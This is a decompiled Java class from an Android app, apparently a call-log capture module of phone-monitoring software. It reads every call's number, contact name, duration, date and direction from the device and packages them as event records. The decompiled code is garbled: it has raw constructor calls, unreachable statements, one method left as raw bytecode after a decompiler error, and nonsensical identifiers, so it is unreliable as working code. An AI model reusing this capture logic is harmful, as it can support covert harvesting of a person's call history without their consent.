package com.vvt.capture.calllog.b;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.g;
import com.vvt.capture.calllog.CallData;
import com.vvt.capture.calllog.CallData.Type;
import java.util.ArrayList;
import java.util.List;

public class f
  implements com.vvt.base.capture.f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private ContentResolver d;
  
  public f(ContentResolver paramContentResolver)
  {
    this.d = paramContentResolver;
  }
  
  private CallData a(Cursor paramCursor)
  {
    new CallData();
    int i = paramCursor.getColumnIndex("_id");
    long l1 = paramCursor.getLong(i);
    i = paramCursor.getColumnIndex("number");
    String str1 = paramCursor.getString(i);
    i = paramCursor.getColumnIndex("name");
    String str2 = paramCursor.getString(i);
    i = paramCursor.getColumnIndex("duration");
    int j = paramCursor.getInt(i);
    i = paramCursor.getColumnIndex("date");
    long l2 = paramCursor.getLong(i);
    i = paramCursor.getColumnIndex("type");
    int k = paramCursor.getInt(i);
    CallData.Type localType = CallData.Type.MISSED;
    int m = 1;
    if (k == m) {
      localType = CallData.Type.IN;
    }
    for (;;)
    {
      Object localObject = CallData.Type.MISSED;
      if (localType == localObject) {
        j = 0;
      }
      localObject = new com/vvt/capture/calllog/CallData;
      ((CallData)localObject).<init>();
      ((CallData)localObject).a(l1);
      ((CallData)localObject).b(l2);
      long l3 = j;
      ((CallData)localObject).c(l3);
      ((CallData)localObject).a(localType);
      ((CallData)localObject).b(str2);
      ((CallData)localObject).a(str1);
      return (CallData)localObject;
      m = 2;
      if (k == m) {
        localType = CallData.Type.OUT;
      }
    }
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    int i = -1;
    if (paramInt == i) {
      paramInt = -1 >>> 1;
    }
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    Object localObject3 = "_id DESC LIMIT ";
    localObject1 = ((StringBuilder)localObject1).append((String)localObject3).append(paramInt);
    String str = ((StringBuilder)localObject1).toString();
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool2;
    try
    {
      localObject1 = this.d;
      localObject3 = a.a;
      localObject1 = ((ContentResolver)localObject1).query((Uri)localObject3, null, null, null, str);
      if (localObject1 != null)
      {
        for (;;)
        {
          boolean bool3 = ((Cursor)localObject1).moveToNext();
          if (!bool3) {
            break;
          }
          localObject3 = a((Cursor)localObject1);
          localArrayList.add(localObject3);
        }
        bool2 = a;
      }
    }
    finally
    {
      bool2 = c;
      if (!bool2) {}
    }
    for (;;)
    {
      if (bool2) {}
      return localArrayList;
      if (localObject2 != null) {
        ((Cursor)localObject2).close();
      }
    }
  }
  
  public List a(g paramg1, g paramg2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = (Long)paramg1.getReference();
    long l = ((Long)localObject1).longValue();
    boolean bool2 = b;
    if (bool2) {}
    String str1 = "%s > %d";
    int i = 2;
    Object localObject3 = new Object[i];
    String str2 = "_id";
    localObject3[0] = str2;
    int j = 1;
    localObject1 = Long.valueOf(l);
    localObject3[j] = localObject1;
    localObject3 = String.format(str1, (Object[])localObject3);
    try
    {
      localObject1 = this.d;
      Object localObject4 = a.a;
      bool2 = false;
      str1 = null;
      j = 0;
      str2 = null;
      localObject1 = ((ContentResolver)localObject1).query((Uri)localObject4, null, (String)localObject3, null, null);
      if (localObject1 != null)
      {
        for (;;)
        {
          boolean bool3 = ((Cursor)localObject1).moveToNext();
          if (!bool3) {
            break;
          }
          localObject4 = a((Cursor)localObject1);
          localArrayList.add(localObject4);
        }
        bool1 = a;
      }
    }
    finally
    {
      bool1 = c;
      if (!bool1) {}
    }
    for (;;)
    {
      if (bool1) {}
      return localArrayList;
      if (localObject2 != null) {
        ((Cursor)localObject2).close();
      }
    }
  }
  
  public FxSimpleEventReference b()
  {
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    Long localLong = Long.valueOf(c());
    localFxSimpleEventReference.setReference(localLong);
    return localFxSimpleEventReference;
  }
  
  /* Error */
  public long c()
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_1
    //   2: aconst_null
    //   3: astore_2
    //   4: aconst_null
    //   5: astore_3
    //   6: iconst_m1
    //   7: i2l
    //   8: lstore 4
    //   10: iconst_1
    //   11: istore 6
    //   13: iload 6
    //   15: anewarray 162	java/lang/String
    //   18: astore 7
    //   20: ldc 36
    //   22: astore 8
    //   24: aload 7
    //   26: iconst_0
    //   27: aload 8
    //   29: aastore
    //   30: ldc -79
    //   32: astore 9
    //   34: aload_0
    //   35: getfield 31	com/vvt/capture/calllog/removeFromPath/f:d	Landroid/content/ContentResolver;
    //   38: astore 8
    //   40: getstatic 120	com/vvt/capture/calllog/removeFromPath/a:a	Landroid/net/Uri;
    //   43: astore_2
    //   44: aload 8
    //   46: aload_2
    //   47: aload 7
    //   49: aconst_null
    //   50: aconst_null
    //   51: aload 9
    //   53: invokevirtual 126	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   56: astore 7
    //   58: aload 7
    //   60: ifnull +129 -> 189
    //   63: aload 7
    //   65: invokeinterface 180 1 0
    //   70: istore 6
    //   72: iload 6
    //   74: ifeq +115 -> 189
    //   77: iconst_0
    //   78: istore 6
    //   80: aconst_null
    //   81: astore 8
    //   83: aload 7
    //   85: iconst_0
    //   86: invokeinterface 46 2 0
    //   91: lstore 4
    //   93: lload 4
    //   95: lstore 10
    //   97: aload 7
    //   99: ifnull +10 -> 109
    //   102: aload 7
    //   104: invokeinterface 142 1 0
    //   109: getstatic 17	com/vvt/capture/calllog/removeFromPath/f:a	Z
    //   112: istore 12
    //   114: iload 12
    //   116: ifeq +3 -> 119
    //   119: lload 10
    //   121: lreturn
    //   122: astore 8
    //   124: iconst_0
    //   125: istore 6
    //   127: aconst_null
    //   128: astore 8
    //   130: getstatic 25	com/vvt/capture/calllog/removeFromPath/f:MyUncaughtExceptionHandler	Z
    //   133: istore_1
    //   134: iload_1
    //   135: ifeq +3 -> 138
    //   138: aload 8
    //   140: ifnull +10 -> 150
    //   143: aload 8
    //   145: invokeinterface 142 1 0
    //   150: lload 4
    //   152: lstore 10
    //   154: goto -45 -> 109
    //   157: aload_3
    //   158: ifnull +9 -> 167
    //   161: aload_3
    //   162: invokeinterface 142 1 0
    //   167: aload 8
    //   169: athrow
    //   170: astore_2
    //   171: aload 8
    //   173: astore_3
    //   174: aload_2
    //   175: astore 8
    //   177: goto -20 -> 157
    //   180: astore 8
    //   182: aload 7
    //   184: astore 8
    //   186: goto -56 -> 130
    //   189: lload 4
    //   191: lstore 10
    //   193: goto -96 -> 97
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	196	0	this	f
    //   1	134	1	bool1	boolean
    //   3	44	2	localUri	Uri
    //   170	5	2	localObject1	Object
    //   5	169	3	localObject2	Object
    //   8	182	4	l1	long
    //   11	115	6	bool2	boolean
    //   18	165	7	localObject3	Object
    //   22	60	8	localObject4	Object
    //   122	1	8	localObject5	Object
    //   128	48	8	localObject6	Object
    //   180	1	8	localObject7	Object
    //   184	1	8	localObject8	Object
    //   32	20	9	str	String
    //   95	97	10	l2	long
    //   112	3	12	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   34	38	122	finally
    //   40	43	122	finally
    //   51	56	122	finally
    //   130	133	170	finally
    //   63	70	180	finally
    //   85	91	180	finally
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/calllog/removeFromPath/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */